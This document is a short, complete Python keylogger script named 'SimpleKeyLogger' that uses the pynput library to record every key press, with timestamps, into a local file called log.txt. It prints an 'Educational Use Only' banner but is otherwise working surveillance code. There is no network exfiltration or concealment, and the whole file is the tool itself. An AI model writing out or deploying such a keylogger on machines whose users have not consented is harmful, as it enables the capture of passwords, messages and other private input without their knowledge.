from pynput.keyboard import Listener
from datetime import datetime

# Metadata
KEYLOGGER_NAME = "SimpleKeyLogger"
VERSION = "1.0"

# Function to log keystrokes
def log_keystroke(key):
    key = str(key).replace("'", "")  # Clean key format
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("log.txt", "a") as log_file:
        log_file.write(f"[{timestamp}] {key}\n")

# Function to start listening
def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    print("=" * 50)
    print(f"{KEYLOGGER_NAME} - Version {VERSION}")
    print("Educational Use Only")
    print("=" * 50)
    print("[+] Logging started... Press CTRL + C to stop\n")

    # Log session start inside file
    with open("log.txt", "a") as log_file:
        log_file.write("\n" + "=" * 50 + "\n")
        log_file.write(f"Session started at {datetime.now()}\n")
        log_file.write("=" * 50 + "\n")

    try:
        start_logging()
    except KeyboardInterrupt:
        print("\n[+] Logging stopped.")
        with open("log.txt", "a") as log_file:
            log_file.write(f"Session ended at {datetime.now()}\n")
            log_file.write("=" * 50 + "\n")
